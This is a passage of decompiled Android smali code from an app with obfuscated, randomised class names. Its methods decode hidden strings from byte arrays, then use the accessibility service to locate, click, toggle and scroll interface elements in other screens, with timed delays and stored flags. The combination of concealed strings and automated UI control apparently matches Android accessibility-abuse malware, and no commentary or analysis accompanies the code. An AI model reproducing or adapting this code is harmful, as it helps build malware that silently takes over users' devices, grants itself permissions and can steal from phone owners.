    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->r1()V

    return-void

    :array_0
    .array-data 1
        0x53t
        0x7at
        -0x2at
        0xdt
        0x6bt
        -0x75t
        0x76t
        0x1et
        0x1et
        0x65t
        -0x2ct
        0x54t
        0x67t
        -0x78t
        0x6at
        0x10t
        0x46t
        0x7ct
        -0x2bt
        0x44t
    .end array-data

    :array_1
    .array-data 1
        0x30t
        0x15t
        -0x45t
        0x23t
        0x2t
        -0x6t
        0x19t
        0x71t
    .end array-data

    :array_2
    .array-data 1
        0x69t
        -0x57t
        -0x1ft
        0x5t
        -0x44t
        0x47t
        -0xft
        -0xbt
        0x24t
        -0x4at
        -0x1dt
        0x5ct
        -0x50t
        0x44t
        -0x13t
        -0x5t
        0x7ct
        -0x51t
        -0x1et
        0x4ct
        -0x5t
        0x66t
        -0xft
        -0x13t
        0x6ft
        -0x4ct
        -0x21t
        0x4at
        -0x5dt
        0x5ft
        -0x10t
        -0x3t
        0x47t
        -0x59t
        -0x1et
        0x4at
        -0x4et
        0x53t
        -0x14t
        -0x25t
        0x69t
        -0x4et
        -0x1bt
        0x5dt
        -0x44t
        0x42t
        -0x19t
    .end array-data

    :array_3
    .array-data 1
        0xat
        -0x3at
        -0x74t
        0x2bt
        -0x2bt
        0x36t
        -0x62t
        -0x66t
    .end array-data
.end method

.method private static synthetic u2()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->m1()V

    return-void
.end method

.method public static synthetic v(Landroid/os/Handler;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->W1(Landroid/os/Handler;)V

    return-void
.end method

.method static synthetic v0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    return-void
.end method

.method private static v1()V
    .locals 5

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x31

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    :goto_0
    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g:Z

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto/16 :goto_2

    :cond_0
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v3, 0x37

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v4, v2, [B

    fill-array-data v4, :array_3

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    goto :goto_0

    :cond_1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v3, 0xf

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    new-array v4, v2, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    const/4 v4, 0x7

    if-le v3, v4, :cond_3

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g:Z

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v2, 0xc8

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    if-le v3, v4, :cond_2

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g:Z

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto :goto_1

    :cond_2
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    :goto_1
    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    if-le v2, v4, :cond_4

    const/4 v2, 0x6

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    goto :goto_0

    :cond_3
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    sget-object v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/qq;->b:Ljava/lang/String;

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_4

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g:Z

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/i00;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/i00;-><init>()V

    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    goto :goto_2

    :cond_4
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u1()V

    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        -0x36t
        0x61t
        0x5t
        0x26t
        -0x56t
        0x1et
        0x49t
        -0x29t
        -0x79t
        0x7et
        0x7t
        0x7ft
        -0x5at
        0x1dt
        0x55t
        -0x27t
        -0x21t
        0x67t
        0x6t
        0x6ft
        -0x7t
        0x6t
        0x42t
        -0x69t
        -0x38t
        0x6ct
        0x6t
        0x67t
        -0x4ft
        0x2t
        0x47t
        -0x2ct
        -0xat
        0x7et
        0x7t
        0x7ft
        -0x5at
        0x1dt
        0x79t
        -0x2bt
        -0x38t
        0x60t
        0x9t
        0x6ft
        -0x5at
        0x1dt
        0x79t
        -0x34t
        -0x21t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x57t
        0xet
        0x68t
        0x8t
        -0x3dt
        0x6ft
        0x26t
        -0x48t
    .end array-data

    :array_2
    .array-data 1
        -0x50t
        0x3bt
        -0x28t
        -0x3et
        -0x51t
        0x69t
        0x6ct
        0x1bt
        -0x3t
        0x24t
        -0x26t
        -0x65t
        -0x5dt
        0x6at
        0x70t
        0x15t
        -0x5bt
        0x3dt
        -0x25t
        -0x75t
        -0x4t
        0x71t
        0x67t
        0x5bt
        -0x4ft
        0x35t
        -0x2at
        -0x79t
        -0x5ft
        0x6at
        0x6ct
        0x1t
        -0x43t
        0x30t
        -0x16t
        -0x64t
        -0x57t
        0x6ft
        0x66t
        0x6t
        -0x74t
        0x39t
        -0x2ct
        -0x7et
        -0x59t
        0x7ft
        0x66t
        0x2bt
        -0x50t
        0x3bt
        -0x25t
        -0x68t
        -0x5dt
        0x76t
        0x77t
    .end array-data

    :array_3
    .array-data 1
        -0x2dt
        0x54t
        -0x4bt
        -0x14t
        -0x3at
        0x18t
        0x3t
        0x74t
    .end array-data

    :array_4
    .array-data 1
        0x6ct
        -0x55t
        -0x69t
        0x51t
        -0x5ct
        0xct
        -0x7at
        0x58t
        0x64t
        -0x5ft
        -0x24t
        0x4ft
        -0x5et
        0x16t
        -0x6at
    .end array-data

    :array_5
    .array-data 1
        0xdt
        -0x3bt
        -0xdt
        0x23t
        -0x35t
        0x65t
        -0x1et
        0x62t
    .end array-data
.end method

.method private static synthetic v2()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->m1()V

    return-void
.end method

.method public static synthetic w()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->O2()V

    return-void
.end method

.method static synthetic w0()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->j1()V

    return-void
.end method

.method private static w1(I)V
    .locals 7

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->A:[Ljava/lang/String;

    array-length v1, v0

    const/4 v2, 0x0

    move v3, v2

    :goto_0
    const/16 v4, 0x3e8

    if-ge v3, v1, :cond_2

    aget-object v5, v0, v3

    sget-object v6, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v6, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->c(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_0

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-eqz v6, :cond_0

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v6

    if-eqz v6, :cond_0

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    :goto_1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v4}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->y1()V

    return-void

    :cond_0
    if-eqz v5, :cond_1

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-eqz v6, :cond_1

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-eqz v6, :cond_1

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    if-eqz v6, :cond_1

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    invoke-virtual {v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v6

    if-eqz v6, :cond_1

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    goto :goto_1

    :cond_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_2
    if-lez p0, :cond_4

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x2b

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isScrollable()Z

    move-result v1

    if-eqz v1, :cond_3

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0xc8

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_3
    add-int/lit8 p0, p0, -0x1

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w1(I)V

    invoke-static {v4}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    goto :goto_2

    :cond_4
    sput-boolean v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->o:Z

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->x1()V

    :goto_2
    return-void

    :array_0
    .array-data 1
        0x5dt
        0x58t
        -0x35t
        0x2at
        0x3ft
        0x6bt
        -0x10t
        0x57t
        0x51t
        0x5et
        -0x3et
        0x2at
        0x2dt
        0x60t
        -0x20t
        0x51t
        0x57t
        0x59t
        -0x3ft
        0x77t
        0x64t
        0x6ct
        -0x10t
        0xat
        0x5at
        0x56t
        -0x2bt
        0x6ct
        0x3ct
        0x6at
        -0xbt
        0x57t
        0x5at
        0x68t
        -0x3bt
        0x6bt
        0x30t
        0x71t
        -0xbt
        0x4ct
        0x50t
        0x52t
        -0x2ct
    .end array-data

    :array_1
    .array-data 1
        0x3et
        0x37t
        -0x5at
        0x4t
        0x5et
        0x5t
        -0x6ct
        0x25t
    .end array-data
.end method

.method private static synthetic w2(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    .line 1
    sget-object v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->M:Ljava/lang/String;

    invoke-static {p0, v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->N:Ljava/lang/String;

    invoke-static {p0, p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->O:Ljava/lang/String;

    invoke-static {p0, p1, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->P:Ljava/lang/String;

    invoke-static {p0, p1, p4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/16 p1, 0xa

    new-array p1, p1, [B

    fill-array-data p1, :array_0

    const/16 p2, 0x8

    new-array p3, p2, [B

    fill-array-data p3, :array_1

    invoke-static {p1, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    sget-object p3, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p0, p1, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    new-array p1, p2, [B

    fill-array-data p1, :array_2

    new-array p2, p2, [B

    fill-array-data p2, :array_3

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p1, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    return-void

    nop

    :array_0
    .array-data 1
        -0x48t
        -0x38t
        -0x5ft
        -0x6et
        0x3bt
        0x0t
        -0x1ct
        -0x41t
        -0x59t
        -0x39t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x38t
        -0x57t
        -0x2et
        -0x1ft
        0x4ct
        0x6ft
        -0x6at
        -0x25t
    .end array-data

    :array_2
    .array-data 1
        -0x57t
        -0x33t
        -0x65t
        -0x1bt
        0x7et
        -0x4bt
        0x35t
        0x36t
    .end array-data

    :array_3
    .array-data 1
        -0x3ct
        -0x5et
        -0x1t
        -0x80t
        0x1at
        -0x24t
        0x54t
        0x59t
    .end array-data
.end method

.method public static synthetic x()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->k2()V

    return-void
.end method

.method private static x0()V
    .locals 4

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S2()Landroid/content/Context;

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x1e

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v1

    if-nez v1, :cond_0

    :goto_0
    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto :goto_1

    :cond_0
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x26

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v2, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v1

    if-nez v1, :cond_1

    goto :goto_0

    :cond_1
    :goto_1
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/xy;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/xy;-><init>()V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :array_0
    .array-data 1
        -0x27t
        -0x28t
        -0x5t
        -0x62t
        -0x74t
        -0x33t
        0x7at
        0x30t
        -0x6ct
        -0x2at
        -0xct
        -0x2bt
        -0x40t
        -0x33t
        0x68t
        0x70t
        -0x34t
        -0x28t
        -0x1bt
        -0x11t
        -0x68t
        -0x2ft
        0x78t
        0x2bt
        -0x2bt
        -0x27t
        -0x37t
        -0x21t
        -0x76t
        -0x30t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x46t
        -0x49t
        -0x6at
        -0x50t
        -0x6t
        -0x5ct
        0xct
        0x5ft
    .end array-data

    :array_2
    .array-data 1
        -0x65t
        -0x39t
        0x38t
        0x26t
        -0x3ft
        -0x52t
        0xft
        0x1ct
        -0x2at
        -0x28t
        0x3at
        0x7ft
        -0x33t
        -0x53t
        0x13t
        0x12t
        -0x72t
        -0x3ft
        0x3bt
        0x6ft
        -0x6et
        -0x4at
        0x4t
        0x5ct
        -0x72t
        -0x39t
        0x26t
        0x57t
        -0x36t
        -0x56t
        0x14t
        0x7t
        -0x69t
        -0x3at
        0xat
        0x67t
        -0x28t
        -0x55t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x8t
        -0x58t
        0x55t
        0x8t
        -0x58t
        -0x21t
        0x60t
        0x73t
    .end array-data
.end method

.method private static x1()V
    .locals 1

    .line 1
    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->o:Z

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->H1()V

    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/4 v0, 0x5

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w1(I)V

    return-void
.end method

.method private static synthetic x2(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 12

    .line 1
    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_0

    new-array v2, v0, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    const/4 v1, 0x1

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->w:Z

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;

